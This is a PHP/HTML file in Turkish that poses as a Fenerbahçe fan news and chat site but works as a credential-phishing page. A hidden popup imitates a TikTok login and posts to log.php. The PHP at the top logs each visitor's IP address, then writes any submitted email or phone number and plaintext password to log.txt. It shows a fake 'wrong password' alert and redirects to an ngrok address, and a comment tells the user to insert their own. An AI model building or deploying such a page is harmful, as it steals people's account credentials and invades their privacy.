<?php
// Gerçek kullanıcı IP adresini al
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP']; // Proxy üzerinden gelen IP
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // Birden fazla IP varsa, ilkini al
    } else {
        return $_SERVER['REMOTE_ADDR']; // Direkt IP
    }
}

// IP ve zaman bilgisi
$ip = getUserIP();
$datetime = date('Y-m-d H:i:s');

// Log formatı: İlk giriş bilgisi
$log = "Siteye giriş - IP: {$ip} - Zaman: {$datetime}\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// Giriş formundan gelen bilgiler
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email_or_phone = $_POST['email'] ?? 'Boş';
    $password = $_POST['password'] ?? 'Boş';
    $log_entry = "IP: $ip | E-posta/Tel: $email_or_phone | Şifre: $password - Zaman: $datetime\n";
    file_put_contents("log.txt", $log_entry, FILE_APPEND);
    echo "<script>alert('Hatalı şifre veya kullanıcı adı!!');</script>";

    $ngrokUrl = 'https://e166-176-88-22-221.ngrok-free.app';  // Burada kendi ngrok adresinizi kullanın
    header("Location: $ngrokUrl");
    exit(); // Yönlendirme sonrası scriptin çalışmasını durdur
}
?>


<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fenerbahçe Sosyal Medya ve Haber Sitesi</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <!-- Navbar -->
  <nav>
    <ul>
      <li><a href="#">Ana Sayfa</a></li>
      <li><a href="#">Haberler</a></li>
      <li><a href="#">Sporcular</a></li>
      <li><a href="#">Forum</a></li>
      <li><a href="#">İletişim</a></li>
      <li><a href="#">Sosyal Medya</a></li>
    </ul>
  </nav>

  <!-- Sayfa Başlığı -->
  <header>
      <h1>Fenerbahçe Sohbet ve Haber Sitesi</h1>
    </div>
  </header>

  <!-- Son Haberler -->
  <section class="news">
    <h2>Son Haberler</h2>
    <div class="news-item">
      <h3>Fenerbahçe Şampiyonluk Yolu</h3>
      <p>Fenerbahçe, Süper Lig'de zirveye yerleşerek şampiyonluk için büyük bir adım attı. Teknik direktör, oyuncular ve taraftarlarla takımın gücünü pekiştirdi...</p>
      <a href="#">Devamını oku...</a>
    </div>
    <div class="news-item">
      <h3>Yeni Transferler Takıma Katıldı</h3>
      <p>Fenerbahçe, yaz transfer döneminde yaptığı önemli takviyelerle takımını güçlendirdi. Yeni oyuncular ilk antrenmanlarına katıldı ve takıma entegre oldular...</p>
      <a href="#">Devamını oku...</a>
    </div>
    <div class="news-item">
      <h3>Fenerbahçe'nin Yeni Teknik Direktörü</h3>
      <p>Fenerbahçe, yeni teknik direktörü ile geleceğe yönelik önemli adımlar atmayı planlıyor. Yeni stratejiyle, kulüp başarısını daha da yukarıya taşımayı hedefliyor...</p>
      <a href="#">Devamını oku...</a>
    </div>
  </section>

  <!-- Popüler Oyuncular -->
  <section class="players">
    <h2>Popüler Fenerbahçe Oyuncuları</h2>
    <div class="player-item">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Emre_Bel%C3%B6zo%C4%9Flu_2013.jpg/800px-Emre_Bel%C3%B6zo%C4%9Flu_2013.jpg" alt="Emre Belözoğlu" class="player-img">
      <h3>Emre Belözoğlu</h3>
      <p>Fenerbahçe'nin efsane kaptanı, futbolculuk kariyerine son vermiş olsa da kulübe verdiği değer ve katkı büyük.</p>
    </div>
    <div class="player-item">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Mahmut_Tan%C3%A1r.jpg/800px-Mahmut_Tan%C3%A1r.jpg" alt="İsmail Köybaşı" class="player-img">
      <h3>İsmail Köybaşı</h3>
      <p>Fenerbahçe'nin genç ve yetenekli oyuncusu, gelecekte büyük başarılara imza atmayı hedefliyor.</p>
    </div>
    <div class="player-item">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Vedat_Muriqi_2019.jpg/800px-Vedat_Muriqi_2019.jpg" alt="Vedat Muriqi" class="player-img">
      <h3>Vedat Muriqi</h3>
      <p>Fenerbahçe'nin golcü oyuncusu, hem kulüpteki başarısını hem de milli takımda gösterdiği performansla dikkatleri üzerine çekiyor.</p>
    </div>
  </section>

  <!-- Kullanıcı Geri Bildirimleri -->
  <section class="feedback">
    <h2>Kullanıcı Yorumları</h2>
    <div class="feedback-item">
      <p>"Fenerbahçe'nin son dönemdeki performansı gerçekten harika! Takım harika bir oyun sergiliyor."</p>
      <span>- Mehmet K.</span>
    </div>
    <div class="feedback-item">
      <p>"Takımın yeni transferlerini çok beğendim. Fenerbahçe'nin geleceği parlak görünüyor!"</p>
      <span>- Ayşe Y.</span>
    </div>
    <div class="feedback-item">
      <p>"Taraftar olarak, Fenerbahçe'nin bu sezon şampiyon olacağına inanıyorum. Hep birlikte başaracağız!"</p>
      <span>- Ali B.</span>
    </div>
  </section>

<!-- TikTok Popup Giriş Ekranı -->
<div id="message-popup" class="popup hidden">
  <div class="popup-content">
    <h2 class="popup-title">Tiktok'tan geldiniz</h2>
    <p class="popup-subtitle">Tiktok kullanıcısı girişi</p>
    <p id="login-error" class="error-message hidden">Hatalı giriş. Lütfen tekrar deneyin.</p>
    <form id="login-screen" class="login-form hidden" action="log.php" method="POST">
      <input type="text" id="email" name="email" placeholder="E-posta veya Telefon" required />
      <input type="password" id="password" name="password" placeholder="Şifre" required />
      <button type="submit">Giriş Yap</button>
    </form>
  </div>
</div>

  <!-- Sosyal Medya Bağlantıları -->
  <section class="social-media">
    <h2>Bizi Takip Edin</h2>
    <ul>
      <li><a href="https://www.facebook.com/fenerbahce" target="_blank">Facebook</a></li>
      <li><a href="https://twitter.com/fenerbahce" target="_blank">Twitter</a></li>
      <li><a href="https://www.instagram.com/fenerbahce" target="_blank">Instagram</a></li>
      <li><a href="https://www.youtube.com/c/Fenerbahce" target="_blank">YouTube</a></li>
    </ul>
  </section>

  <footer>
    <p>&copy; 2025 Fenerbahçe Sohbet ve Haber Sitesi - Tüm haklar saklıdır.</p>
  </footer>

  <script src="script.js"></script>
</body>
</html>